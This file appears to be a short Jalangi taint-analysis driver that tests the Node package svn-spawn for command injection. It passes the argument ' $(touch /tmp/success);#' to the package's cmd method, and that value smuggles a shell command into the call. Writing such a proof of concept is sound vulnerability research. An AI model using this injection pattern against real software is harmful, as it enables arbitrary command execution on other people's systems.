// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/svn-spawn/node_modules/svn-spawn');
try {
	var x0 = {};
var x1 = [" $(touch /tmp/success);#"];
var put = new PUT();
	put["cmd"](x0,x1)();
} catch (e) {
	console.log(e);
}